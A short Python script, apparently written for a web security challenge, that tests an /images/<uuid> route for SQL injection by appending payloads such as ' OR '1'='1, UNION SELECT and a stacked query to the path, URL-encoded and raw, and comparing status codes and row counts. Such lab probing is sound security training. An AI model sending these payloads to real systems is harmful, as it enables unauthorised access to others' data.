# probe_path_sqli.py — the <uuid> route is laxer than the browser suggested (accepts uppercase,
# double slash). Test SQL injection directly in the path via requests (not the browser).
# If /images/<uuid> builds SQL by concatenation, a crafted suffix may unbalance it (500) or
# return foreign rows (rows != our 62).
import requests, urllib.parse

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"

def get(raw_suffix, encode=True):
    seg = urllib.parse.quote(UID + raw_suffix, safe="") if encode else (UID + raw_suffix)
    url = f"{BASE}/images/{seg}"
    r = requests.get(url)
    n = -1
    try: n = len(r.json())
    except: pass
    return r.status_code, n, r.text[:80].replace("\n"," ")

tests = [
    ("baseline",            ""),
    ("single quote",        "'"),
    ("or 1=1 (enc)",        "' OR '1'='1"),
    ("or 1=1 comment",      "' OR 1=1-- "),
    ("union",               "' UNION SELECT 1-- "),
    ("append hex",          "aaaa"),                 # still uuid-hex chars: does it still match?
    ("semicolon drop",      "'; SELECT 1-- "),
]
for name, suf in tests:
    sc, n, body = get(suf, encode=True)
    print(f"{name:18} enc -> {sc} rows={n}  {body[:50]}")
# also try NOT url-encoding (raw), since the route seemed lax
print("--- raw (unencoded) ---")
for name, suf in [("single quote", "'"), ("or 1=1", " OR 1=1")]:
    sc, n, body = get(suf, encode=False)
    print(f"{name:18} raw -> {sc} rows={n}  {body[:50]}")
